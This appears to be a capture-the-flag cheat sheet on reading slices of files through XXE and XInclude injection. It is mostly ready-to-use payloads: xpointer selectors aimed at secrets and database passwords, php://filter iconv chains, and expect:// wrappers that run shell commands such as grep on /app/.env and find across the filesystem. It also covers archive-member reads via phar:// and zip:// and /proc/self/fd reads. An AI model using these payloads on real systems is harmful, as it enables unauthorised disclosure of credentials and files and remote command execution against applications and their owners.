# Fragment Read — reading a slice of a file

## The problem — sometimes you want a piece, not the whole

- a huge log — you want the last lines
- a config — you want one section
- an XML file — you want one element
- a multi-line flag file — you want one line

## The `xpointer` fragment — XML docs only

```xml
<xi:include href="file:///x.xml" parse="xml" xpointer="xpointer(/root/flag)"/>
<xi:include href="file:///x.xml" parse="xml" xpointer="xpointer(//secret)"/>
<xi:include href="file:///x.xml" parse="xml" xpointer="element(/1/2)"/>
<xi:include href="file:///x.xml" parse="xml" xpointer="xpointer(/config/db/password)"/>
```

`xpointer` selects a node-set — the include returns just that element —
the XML-slice read.

## The `range-to`/`string-range` — the char-slice

```xml
xpointer="xpointer(string-range(//p,'needle'))"
```

`string-range` — selects the range containing the needle — a regex-
adjacent read — parser-dependent (XInclude 2001 has limited xpointer).

## The `position`/`nth` — the line-slice

```xml
xpointer="xpointer(/root/line[42])"
xpointer="xpointer(//line[position()=42])"
```

The nth-element read — if the doc has per-line elements.

## The `php://filter` byte-slice — non-XML files

For non-XML files, `xpointer` doesn't apply — the `php://filter`
`iconv`-family can transform-and-truncate:

```php
php://filter/convert.iconv.utf-8.utf-16/resource=/log   — byte-swap
php://filter/convert.iconv.utf-8.ucs-4le/resource=/log   — pad
```

Not a clean slice — but `iconv` chains can produce byte-level
transforms — the `web-sqli` `filter-chain-oracle` technique applies.

## The "the file is a list" — the line-number read

A line-numbered file — read by line via a `sed`-in-`expect://` chain
(PHP `expect://` only):

```
expect://sed%20-n%20'10,20p'%20/flag
expect://tail%20-5%20/var/log/x
expect://head%20-1%20/flag
expect://grep%20flag%20/etc/config
```

The exec-chain line-read — `expect://` is a stream-wrapper that runs
the command — the read is the command's output.

## The "the flag is on a specific line" — the targeted read

`expect://sed -n '3p' /flag` — the 3rd line only — when the file is
known to have the flag on line N.

## The "the file is a `tar`/`zip`" — the member-read

`jar:`/`phar://`/`zip://`/`rar://` — read a member inside an archive
without extracting:

```
jar:file:///x.jar!/inside/path.txt
phar:///x.phar/inside/path.txt
zip:///x.zip#inside/path.txt           — some PHP builds
rar:///x.rar#inside/path.txt
```

The archive-member read — the container-aware read.

## The "the file is a `.db`/`sqlite`" — the DB read

A `.sqlite`/`.db` file — XXE can't query it — read the raw bytes via
`php://filter` base64 or `file://` + post-process — the "the DB is
a file" read — the raw bytes carry strings.

## The "the file is a memory-mapped structure" — the fd-read

`/proc/self/fd/N` — an open file the app has mmap'd — the fd-read
surfaces the mapped content — `env-secret-read.md`.

## The "the flag is a sub-element" — the XML-member read

A `flag.xml` with `<flag>` — read the whole doc, the `&x;` echo
carries it — or `xpointer(//flag)` for the slice.

## The "the flag is in a `key=value` config" — the grep-read

```
expect://grep%20FLAG%20/app/config
expect://find%20/%20-name%20'flag*'
expect://cat%20/app/.env%20|%20grep%20FLAG
```

`expect://` command-chaining — the shell-pipe — the grep-read.

## The "the read needs a range" — the offset problem

XXE entities read WHOLE files — a range-read needs either `expect://`
exec, `xpointer` (XML), `phar:`/zip-member, or a `php://filter` byte-
manipulation — the "read a slice" problem has no clean generic XXE
answer — the exec/`xpointer` paths are the real ones.
